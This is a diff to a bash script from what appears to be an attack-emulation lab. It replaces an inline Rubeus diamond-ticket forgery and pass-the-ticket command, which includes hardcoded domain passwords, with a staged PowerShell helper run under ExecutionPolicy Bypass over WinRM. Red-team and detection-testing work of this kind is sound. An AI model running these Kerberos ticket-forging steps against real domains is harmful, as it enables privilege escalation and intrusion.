@@ -9,9 +9,16 @@ echo "=== T012 | ${CASE_ID} | T0=${T0} ==="
 
 ws01_ensure_rubeus
 
-# Diamond requires TGT from legitimate user — use chief_command TGT then diamond
+ws01_ensure_rubeus
+
+# Run diamond-ticket via PowerShell helper (avoids quoting hell across WinRM)
+PS1="${CAMPAIGN_A_LIB}/../windows/campaign-a-t012-diamond.ps1"
+PS1_BASENAME="campaign-a-t012-diamond.ps1"
+PS1_REMOTE="C:\\Tools\\cadre-attack\\${PS1_BASENAME}"
+WS01_AD_USER=analyst_t1 WS01_AD_PASS='T13r_An@lyst!' bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "$PS1" "$PS1_BASENAME" || true
+
 ws01_exec_as analyst_t1 'T13r_An@lyst!' \
-  'C:\Tools\cadre-attack\Rubeus.exe asktgt /user:chief_command /password:C0mm@nd_Ch1ef! /domain:cadre.local /dc:dc01.cadre.local /nowrap /ptt; C:\Tools\cadre-attack\Rubeus.exe diamond /ticket:current /enctype:aes /ptt /nowrap; klist'
+  "powershell -ExecutionPolicy Bypass -File $PS1_REMOTE"
 
 cadre_export "${CASE_ID}" T012 "${T0}" 192.168.77.62
 echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
